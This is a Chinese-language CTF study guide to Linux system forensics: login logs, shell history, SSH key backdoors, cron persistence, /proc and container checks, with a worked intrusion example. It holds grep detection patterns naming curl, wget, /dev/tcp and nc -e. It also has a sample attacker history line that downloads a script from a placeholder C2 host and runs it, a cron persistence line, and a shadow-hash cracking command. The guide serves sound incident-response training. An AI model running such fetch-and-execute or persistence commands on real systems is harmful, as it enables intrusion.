# Linux 系统取证

关键词：Linux 取证 linux forensics bash_history auth.log secure wtmp btmp last lastb cron crontab authorized_keys ssh 后门 /tmp ps /proc 容器 docker overlay 用户痕迹

## ① 识别指纹

- 附件是 `/` 目录打包（`etc/`、`var/log/`、`home/`、`root/`），或一块 ext4 分区镜像
- 单文件形态：`auth.log` / `secure` / `wtmp` / `btmp` / `lastlog`、`.bash_history`、`authorized_keys`、`crontab`、`/etc/shadow`
- 目录里出现 `var/lib/docker/`、`overlay2/`、`diff/`、`merged/` —— 容器相关，先去第 11 条预判
- 题干出现"Linux 服务器被入侵"、"谁登录了"、"后门在哪"、"他执行了什么"
- 常与 pcap / 内存镜像一起给：网络侧看入口，磁盘侧看落地

## ② 考什么

- **登录记录**：`/var/log/auth.log`（Debian/Ubuntu）、`/var/log/secure`（RHEL/CentOS）、`wtmp`（成功登录，`last`）、`btmp`（失败登录，`lastb`）、`lastlog`、systemd `journal`
- **命令历史**：`~/.bash_history`、`.zsh_history`、`.python_history`、`.mysql_history`；`HISTFILE` / `HISTTIMEFORMAT` 被篡改
- **SSH 痕迹**：`authorized_keys`（后门公钥）、`known_hosts`（连过谁）、`sshd_config`（改端口/允许 root）
- **持久化**：`/etc/crontab`、`/etc/cron.*`、`/var/spool/cron`、systemd unit、`rc.local`、`init.d`、`.bashrc` / `.bash_logout`、`/etc/ld.so.preload`、PAM
- **用户与凭据**：`/etc/passwd`（UID 0 的隐藏账户）、`/etc/shadow`（hash 破解）、`/etc/sudoers`
- **进程与 `/proc`**：`cmdline`、`exe`、`cwd`、`environ`、`fd`；已删除但仍运行的二进制
- **文件时间**：`mtime` 可被 `touch` 伪造，`ctime` 更难改；用 `find -newermt` 圈时间窗
- **Web 落地**：web 根目录下的 webshell、上传目录、`.htaccess`
- **容器与宿主机**：`/.dockerenv`、`/proc/1/cgroup`、overlay2 的 `diff` / `merged` / `lower`
- **删除恢复**：ext4 的 `debugfs` / `extundelete`，或 TSK 按 inode 取

## ③ 判断流程

1. **先清点**：`ls -la` 顶层 + `find . -maxdepth 3 -type f | head`。是整盘镜像 → 先去 [磁盘镜像](/forensics/disk) 定位分区并挂载/解包；是目录 → 跳第 2 条；只有单个 `auth.log` / `bash_history` → 直接跳第 3 / 第 4 条。
2. **固定时间基准**：`cat /etc/timezone`、`ls -l /etc/localtime`、`date`，再 `stat` 一个已知文件确认时区；把该时区记下来，后续所有时间统一换算成 UTC → 跳第 3 条。
3. **登录记录**：`last -f wtmp` 与 `lastb -f btmp` 看成功/失败；`zgrep -hE 'Accepted|Failed password|Invalid user' auth.log*` 看 SSH 明细。有成功登录 → 记下用户、源 IP、时间，跳第 4 条；只有失败 → 跳第 4 条确认是否后续成功；日志为空或缺失 → 跳第 4 条（改看历史）。
4. **命令历史**：逐个用户 `cat ~/.bash_history`，同时 `grep -H 'HISTFILE\|HISTTIMEFORMAT'` 查是否被改。出现可疑下载、解码、执行命令 → 记下 URL / 路径，跳第 5 条；历史被清空或指向 `/dev/null` → 跳第 5 条，靠 SSH 与文件时间补。
5. **SSH 后门**：`cat /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys`，按 `stat` 的 mtime 排序，找新增公钥与 `command=` / `from=` 前缀。题干问"后门/权限维持" → 记录公钥内容与时间，结束；不是 → 跳第 6 条。
6. **定时任务**：`cat /etc/crontab`、`ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly`、`cat /var/spool/cron/crontabs/*`（Debian）或 `/var/spool/cron/*`（RHEL）。发现可疑任务 → 取出它执行的脚本/命令，跳第 7 条；没有 → 跳第 7 条。
7. **启动与加载项**：查 `~/.bashrc`、`~/.profile`、`~/.bash_logout`、`/etc/rc.local`、`/etc/ld.so.preload`、`systemctl list-unit-files --state=enabled`、SUID 文件、PAM 配置（`/etc/pam.d/*` 与 `/lib/*/security/` 的新增模块）。找到落地脚本或二进制 → 读内容，命中 flag → 结束；没有 → 跳第 8 条。
8. **进程与 `/proc`**：有 live 环境或内存镜像时，`ps auxf`，逐个看 `/proc/<pid>/exe`（带 `(deleted)` 的最可疑）、`cmdline`、`cwd`、`environ`、`fd`。可疑进程 → `cp /proc/<pid>/exe` 取样本，跳第 10 条；没有 live 环境 → 跳第 9 条。
9. **文件残留**：`/tmp`、`/var/tmp`、`/dev/shm`、web 根目录、用户家目录；用 `find <根> -xdev -newermt '<入侵时间>' -type f` 圈出窗口内的新文件，`find ... -name '.*'` 找隐藏文件。找到落地文件 → 读内容，命中 → 结束；没有 → 跳第 10 条。
10. **用户与凭据**：`awk -F: '$3==0' /etc/passwd` 找 UID 0 的异常账户；`/etc/shadow` 取 hash 交给 `john`；`/etc/sudoers` 看提权。找到异常账户或解出密码 → 结束；没有 → 跳第 11 条。
11. **容器场景**：`ls -la /.dockerenv`、`cat /proc/1/cgroup`、`mount | grep overlay`。在容器内 → 记录 `mount` 输出里的 `upperdir`，直接去那个目录找容器写入的文件，跳第 12 条；不在容器内 → 跳第 12 条。
12. **删除与轮转**：日志 `.gz` 全部 `zgrep`，不要只查当前文件；ext4 镜像用 `debugfs -R 'ls -l /'`、`extundelete`，或 TSK 的 `fls -r -p` / `tsk_recover` → [磁盘镜像](/forensics/disk)。找到目标 → 结束；没有 → 跳第 13 条。
13. **兜底**：`grep -rIl 'flag' /home /root /tmp /var/www /etc 2>/dev/null`；`grep -rInE 'curl|wget|base64 -d|/dev/tcp|nc -e'` 找一行木马；`strings` 扫可疑二进制。命中 → 读内容，结束；没命中 → 跳第 14 条。
14. **全部走空** → 回到第 3 条，换一个时间窗口（例如从首次失败登录往前推 1 小时）重扫；仍然没有 → 回 [题型总表](/map)，改从 pcap / 内存侧找入口。

## ④ 工具与命令

```bash
# 登录记录
last -f wtmp
last -i -f wtmp          # 显示 IP 而不是主机名
lastb -f btmp
utmpdump wtmp | tail

zgrep -hE 'Accepted (password|publickey)|Failed password|Invalid user|session opened' auth.log*
grep 'Failed password' auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
```

```bash
# systemd 日志（离线目录用 -D）
journalctl -D /var/log/journal --since '2024-05-01 00:00:00' --until '2024-05-02 00:00:00'
```

```bash
# 命令历史
cat /home/*/.bash_history /root/.bash_history
grep -H 'HISTFILE\|HISTTIMEFORMAT' /home/*/.bashrc /root/.bashrc
# 设了 HISTTIMEFORMAT 时，history 文件里的 #<epoch> 行是对应命令的时间，可换算成 UTC
```

```bash
# SSH
cat /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys
cat /home/*/.ssh/known_hosts
stat -c '%y %n' /home/*/.ssh/authorized_keys
grep -vE '^#|^$' /etc/ssh/sshd_config
```

```bash
# 持久化
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly
cat /var/spool/cron/crontabs/* 2>/dev/null   # Debian/Ubuntu
cat /var/spool/cron/* 2>/dev/null            # RHEL/CentOS

grep -rnE 'curl|wget|base64 -d|/dev/tcp|nc ' \
  /etc/rc.local /etc/profile /etc/bash.bashrc /home/*/.bashrc 2>/dev/null
cat /etc/ld.so.preload 2>/dev/null
ls -lt /lib/*/security /lib/security 2>/dev/null
grep -rnE 'pam_exec|pam_permit' /etc/pam.d 2>/dev/null
find / -xdev -perm -4000 -type f 2>/dev/null
systemctl list-unit-files --state=enabled
```

```bash
# 进程与 /proc（live 或内存恢复环境）
ps auxf
ls -l /proc/<pid>/exe
tr '\0' ' ' < /proc/<pid>/cmdline
tr '\0' '\n' < /proc/<pid>/environ
ls -l /proc/<pid>/cwd /proc/<pid>/fd
cp /proc/<pid>/exe /tmp/sample
```

```bash
# 文件残留与时间窗
find /tmp /var/tmp /dev/shm -type f -ls 2>/dev/null
find / -xdev -newermt '2024-05-01 00:00:00' -type f 2>/dev/null
find /var/www -type f \( -name '*.php' -o -name '*.jsp' \) -newermt '2024-05-01'
grep -rnE 'eval\(|base64_decode\(|assert\(|system\(|passthru\(' /var/www
```

```bash
# 用户与凭据
awk -F: '$3==0 {print}' /etc/passwd
cat /etc/shadow
cat /etc/sudoers
john --wordlist=rockyou.txt shadow.txt
```

```bash
# 删除恢复（ext4 镜像）
debugfs -R 'ls -l /' 镜像
debugfs -R 'stat <inode>' 镜像
extundelete 镜像 --restore-all
fls -r -p -o <Start> 镜像
```

```bash
# 容器判断
ls -la /.dockerenv
cat /proc/1/cgroup
mount | grep overlay
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| `last` 只输出 `wtmp begins ...` | `wtmp` 被清空或轮转 | 找 `wtmp.1`、`wtmp-*`，`last -f` 指定文件 |
| 找不到 `auth.log` | 发行版用 `/var/log/secure`，或只有 journald | 换 `secure`；再用 `journalctl -D` 读 journal |
| 历史命令没有时间 | 没设 `HISTTIMEFORMAT`，默认只存命令 | 用登录记录、文件 mtime、进程启动时间交叉定位 |
| `.bash_history` 是空的 | 攻击者清理，或 `HISTFILE=/dev/null` | 查 `.bashrc` / `.profile`；改用 auditd、`/proc`、文件时间 |
| `mtime` 和故事线对不上 | 攻击者用 `touch` 伪造了 mtime | 看 `ctime`（inode 变更时间），改时钟才能动它；两者矛盾就是线索 |
| 时间差 8 小时 | 服务器本地时区 vs UTC | 先读 `/etc/timezone` / `/etc/localtime`，全链换算 UTC |
| 离线目录里 `ps` 没用 | 目录不是运行中的系统 | `/proc` 只在 live / 内存镜像里有；离线改看 `wtmp`、日志、文件 |
| 把容器当宿主机查 | 目录来自容器层，看不到宿主机 | `/.dockerenv`、`/proc/1/cgroup` 判断；去宿主机 overlay2 的 `diff` 找改动 |
| 只查 `/home` 漏掉 root | root 的家目录是 `/root`，服务账户也可能有 history | 同时查 `/root`、`/var/www`、`/tmp`、各服务账户 |
| 日志里 IP 全是内网 | 前面有 NAT / 反向代理 | 看 `X-Forwarded-For`、代理日志，`last -i` 确认 |
| `authorized_keys` 里是正常公钥 | 公钥带 `command=` / `from=` 选项，看起来像正常 key | 看行首选项与 key 注释，结合 mtime 判断 |
| 只查当前日志漏掉历史 | logrotate 把旧日志压成 `.gz` | `zgrep` 所有 `auth.log.*.gz` / `secure-*` |

## ⑥ 例题

**题目**：Linux 服务器 SSH 入侵与后门定位
**来源**：CTF 取证方向的经典题结构，各校赛 "Linux forensic" 与公开应急响应靶场反复使用

**题干**：给一台 Linux 服务器的 `/` 目录打包，描述："服务器被人登进来了。找出他怎么进来的、做了什么、留了什么后门。"

**附件**：服务器 `/` 目录，含 `/var/log`、`/root`、`/etc`、`/tmp`。

**关键观察**：
- `auth.log` 里同一个 IP 出现大量 `Failed password`，随后出现一条 `Accepted password`
- 登录成功后，该用户的 `.bash_history` 里出现 `wget` 下载脚本、`chmod +x`、`./x.sh`
- `~/.ssh/authorized_keys` 的 mtime 与登录时间落在同一时间窗，且新增了一条带注释的公钥
- `/etc/crontab` 里多了一条每分钟执行 `/tmp/.x.sh` 的任务

**走了哪条链**：第 2 条（固定时区）→ 第 3 条（auth.log 找到爆破后成功登录）→ 第 4 条（history 找到落地脚本）→ 第 5 条（authorized_keys 后门）→ 第 6 条（cron 持久化）→ 第 9 条（读 `/tmp` 里的脚本内容）。

**命令与输出**：

```bash
$ grep -E 'Failed password|Accepted password' auth.log
# <时间> ... Failed password for root from <IP> port <port> ssh2
# ...（同一 IP 重复多条）
# <时间> ... Accepted password for root from <IP> port <port> ssh2
```

按源 IP 统计失败次数，第一行就是爆破源（具体次数以附件为准）：

```bash
$ grep 'Failed password' auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
#  <次数> <IP>
```

```bash
$ cat /root/.bash_history
# wget http://<C2>/x.sh -O /tmp/.x.sh
# chmod +x /tmp/.x.sh
# /tmp/.x.sh
```

```bash
$ cat /root/.ssh/authorized_keys
# ssh-rsa AAAA... <注释>
$ stat -c '%y %n' /root/.ssh/authorized_keys
# <与 Accepted password 同一时间窗>
```

```bash
$ cat /etc/crontab
# * * * * * root /tmp/.x.sh
```

```bash
$ cat /tmp/.x.sh
# 反弹 shell / 下载二阶段 / 读取 flag 的命令
# flag{...}
```

**结果**：完整还原入口（SSH 爆破成功）→ 动作（下载并执行脚本）→ 权限维持（authorized_keys + cron）。flag 形如 `flag{...}`，精确值以原题平台为准。

**如果 `auth.log` 被清空**：按第 12 条查 `auth.log.1` 与 `.gz`；同时用 `wtmp` 的 `last` 补成功登录，用 `~/.bash_history` 和文件 `ctime` 补动作时间。三个来源里任意两个对得上，就能确认链路。
